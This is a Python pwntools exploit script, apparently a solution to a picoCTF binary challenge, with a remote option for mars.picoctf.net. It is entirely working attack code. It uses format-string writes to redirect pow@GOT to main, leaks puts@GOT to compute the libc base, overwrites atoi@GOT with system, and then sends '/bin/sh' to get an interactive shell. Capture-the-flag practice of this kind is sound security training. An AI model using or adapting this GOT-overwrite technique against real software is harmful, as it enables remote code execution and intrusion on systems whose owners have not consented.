#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep


context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./chall"
libc = ELF("./libc_2.31-0ubuntu9.2_amd64.so")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("mars.picoctf.net", 31929)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		b *main+411
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)


def clac(buf_A, buf_B):
    p.sendlineafter(':', buf_A)
    p.sendlineafter(':', buf_B)

msg_len = 27

# pow@got(0x400706) -> main (0x400837)
payload_A = b"11111111"
payload_A += p64(elf.got["pow"])

payload_B = b"22222222"
payload_B += "%{0}c%11$hn".format((elf.symbols["main"] & 0xffff) - msg_len - 0x13).encode()

clac(payload_A, payload_B)

# leak puts@got
payload_A = b"11111111"
payload_A += p64(elf.got["puts"])

payload_B = b"22222222"
payload_B += b"%11$s"

clac(payload_A, payload_B)

p.recvuntil("B: 22222222")
puts_got_addr = u64(p.recv(6) + b'\0' * 2)
log.info("puts@libc: " + hex(puts_got_addr))
libc_base = puts_got_addr - libc.symbols["puts"]
log.info("libc base: " + hex(libc_base))

# atoi@got -> system@libc
system_libc_addr = libc_base + libc.symbols["system"]
log.info("system@libc: " + hex(system_libc_addr))

payload_A = b"11111111"
payload_A += p64(elf.got["atoi"] + 2)
payload_A += p64(elf.got["atoi"])

payload_B = b"22222222"
payload_B += "%{0}c%11$hn".format((system_libc_addr >> 16 & 0xffff) - msg_len - 0x13).encode()
payload_B += "%{0}c%12$hn".format((system_libc_addr & 0xffff) - (system_libc_addr >> 16 & 0xffff)).encode()

clac(payload_A, payload_B)
clac(b"/bin/sh\0", b"/bin/sh\0")

p.interactive()
